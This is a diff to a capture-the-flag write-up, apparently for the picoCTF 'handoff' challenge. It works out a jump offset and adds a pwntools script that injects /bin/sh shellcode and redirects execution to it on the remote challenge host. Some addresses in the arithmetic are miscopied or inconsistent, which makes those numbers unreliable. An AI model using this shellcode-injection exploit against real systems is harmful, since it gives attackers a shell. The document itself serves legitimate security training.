@@ -127,12 +127,43 @@ From the image, it's shown that the offset of `message` variable is in `rbp-0x2e
 <img width="1467" height="95" alt="image" src="https://github.com/user-attachments/assets/e2643230-bda1-42ac-bcba-1b5d8aaa6382" /><br>
 <br>
 From the image we know that the address of `RBP` is `0x7fffffffdcf0`.<br>
-so we just need subtract it with the `rbp-0x2e0` to get the exact address of the variable.<br>
+so because we know that we will `jmp rax` to the `rbp-0xc` we need find the address of `rbp-0xc`.<br>
 <br>
-`0x7fffffffdcf0 - 0x2e0 = 0x7fffffffda10`.<br>
+`0x7fffffffdcf0 - 0xc = 0x7fffffffdce4` <br>
 <br>
-Then we just need subtract the result or `0x7fffffffda10` with the address of `RBP` or `0x7fffffffdcf0`.<br>
+Now, we know the address of `rbp-0xc` is `0x7ffffffffce4`, but because the near jump also counted per byte, so it will add by 5. <br>
 <br>
-then we get `0x7fffffffdcf0 - 0x7fffffffda10 = `
+`0x7fffffffdce4 + 5 = 0x7fffffffdce9` <br>
+<br>
+After that we will find the offset from `0x7fffffffdce9` to `rbp-0x2e0` or `0x7ffffffda18`, so we subtract it again. <br>
+<br>
+`0x7fffffffda18 - 0x7fffffffdce9 = -0x2d1`<br>
+<br>
+so that's our offset, so we can create the payload. <br>
+<br>
+```Python
+from pwn import *
+
+elf = context.binary = ELF('./handoff')
+p = process('./handoff')
+io = remote('shape-facility.picoctf.net', 56709)
+
+
+rax_address = 0x000000000040116c
+jmp_rsp_rsp = b"\xe9\x2f\xfd\xff\xff"
+shellcode = asm(shellcraft.sh())
+
+payload = b'1\n'
+payload += b'fishs\n'
+payload += b'2\n'
+payload += b'0\n'
+payload += shellcode + b'\n'
+payload += b'3\n'
+payload += jmp_rsp_rsp + b'b' * 15 + p64(rax_address)
+
+io.send(payload)
+io.interactive()
+```
+
 
 
